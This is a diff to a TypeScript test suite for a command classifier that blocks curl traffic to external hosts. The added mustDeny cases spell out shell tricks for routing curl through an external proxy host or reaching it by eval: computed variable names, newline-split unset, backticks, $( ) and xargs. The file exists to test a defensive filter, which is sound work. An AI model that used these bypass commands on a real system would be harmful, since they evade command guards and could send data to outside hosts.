@@ -90,6 +90,22 @@ const mustDeny: Array<[string, string]> = [
   ['env ${v}proxy= curl', `v=http_; env \${v}proxy=http://${EV}:1 curl -s http://localhost:3420/`],
   ['declare -x "${p}="', `declare -x "\${p}=http://${EV}"; curl -s http://localhost:3420/`],
   ['printf -v a computed name', `printf -v "\${v}proxy" %s http://${EV}; export \${v}proxy; curl -s http://localhost:3420/`],
+  // round 4 (didi 36059): an unset ends at its newline; the computed-name class remainders
+  ['unset, newline, proxy prefix', `unset x\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
+  ['unset, newline, export proxy', `unset x\nexport http_proxy=http://${EV}:8080\ncurl -s http://localhost:3420/`],
+  ['env -u, newline, proxy prefix', `env -u x\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
+  ['env -u with its name on the next line', `env -u\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
+  ['env --unset with its name on the next line', `env --unset\nhttp_proxy=http://${EV}:8080 curl -s http://localhost:3420/`],
+  ['an eval that only assigns, a local curl after it', `v=http_; eval "\${v}proxy=http://${EV}:1"; curl -s http://localhost:3420/`],
+  ['a brace-expanded export name', `export http_{proxy,x}=http://${EV}:1; curl -s http://localhost:3420/`],
+  ['export -- a computed name', `v=http_; export -- \${v}proxy=http://${EV}:1; curl -s http://localhost:3420/`],
+  ['eval of a computed assignment', `v=http_; eval "\${v}proxy=http://${EV}:1 curl -s http://localhost:3420/"`],
+  ['a backtick in the name', `export \`printf http_\`proxy=http://${EV}:1; curl -s http://localhost:3420/`],
+  ['a $( ) in the name', `export $(printf http_)proxy=http://${EV}:1; curl -s http://localhost:3420/`],
+  ['xargs env {}', `echo "\${v}proxy=http://${EV}:1" | xargs -I{} env {} curl -s http://localhost:3420/`],
+  ['xargs env with its own replace string', 'echo a | xargs -I X env X curl -s http://localhost:3420/'],
+  ['eval of a quoted external curl', `eval "curl -s https://${EV}/x"`],
+  ['eval of bare external curl words', `eval curl -s https://${EV}/x`],
   // the array a lifted rest inherits is read in full, an external word in it still denies
   ['an array URL after an unclosed backtick', `U=(https://${EV}/x); python3 -c "print('\`')"\ncurl -s "\${U[@]}"`],
   ['an array written in the lifted rest too', `H=(-H a); python3 -c "print('\`')"\nH+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
@@ -117,6 +133,12 @@ const mustPass: Array<[string, string]> = [
   ['no_proxy only narrows', 'NO_PROXY=localhost curl -s http://localhost:3420/api'],
   ['unset of the proxy variables', 'unset http_proxy https_proxy; curl -s http://localhost:3420/api'],
   ['env -u a proxy variable', 'env -u http_proxy curl -s http://localhost:3420/api'],
+  ['unset then a local curl on the next line', 'unset x y\ncurl -s http://localhost:3420/api'],
+  ['an export with a computed value only', 'export T=$(cat /tmp/t); curl -s http://localhost:3420/api'],
+  ['an export with a backtick value', 'export T=`cat /tmp/t`; curl -s http://localhost:3420/api'],
+  ['eval of a local curl', 'eval "curl -s http://localhost:3420/api"'],
+  ['eval of an ssh-agent', 'eval "$(ssh-agent -s)"'],
+  ['xargs replace in the URL path', 'echo a | xargs -I{} curl -s http://localhost:3420/{}'],
   ['an export with a plain name and a computed value', 'export PATH="$HOME/bin:$PATH"; curl -s http://localhost:3420/api'],
   ['f () { ... } local', 'f () { curl -s http://localhost:3420/api; }; f'],
   // fleet replay (ford): an unclosed backtick lifts the rest of the line; the array written before it holds
@@ -152,5 +174,9 @@ describe('card d6b95892: curl destinations the parser cannot read are denied', (
     ['a fed read', `while read u; do curl -s "$u"; done <<< "https://${EV}/"`],
   ])('reads the host of %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [EV] })
+  })
+  it('reads the host of an eval body, under its own reason', () => {
+    const cmd = `eval "curl -s https://${EV}/x"`
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'eval-curl-external', hosts: [EV] })
   })
 })
